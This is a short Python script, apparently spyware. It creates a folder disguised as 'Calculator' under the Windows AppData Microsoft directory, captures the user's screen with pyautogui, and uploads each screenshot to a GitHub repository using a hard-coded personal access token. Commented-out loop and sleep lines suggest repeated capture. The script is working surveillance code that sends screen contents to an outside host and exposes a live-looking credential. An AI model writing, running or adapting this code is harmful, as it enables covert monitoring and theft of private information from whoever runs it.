import pyautogui
from datetime import datetime
import os
from github.MainClass import Github

github_token = Github("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")
# Directory
directory = "Calculator"

# Parent Directory path
parent_dir = "C:\\Users\\User\\AppData\\Roaming\\Microsoft"

# Path
path = os.path.join(parent_dir, directory)

# Create the directory
os.mkdir(path)


def take_screenshot():
    screenshot = pyautogui.screenshot()
    return screenshot


# while True:

# screenshot details
folder_path = path
screenshot_name = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
file_path = f"{folder_path}\\{screenshot_name}"

screenshot = take_screenshot()
screenshot.save(file_path)

print("Screenshot captured:", screenshot_name)

repo = github_token.get_user().get_repo("pythontest")
print(repo)

# Read the content of the screenshot file
with open(file_path, "rb") as file:
    content = file.read()

# Upload the file to the repository
repo.create_file(f"{screenshot_name}", "commit message", content)
# time.sleep(60)
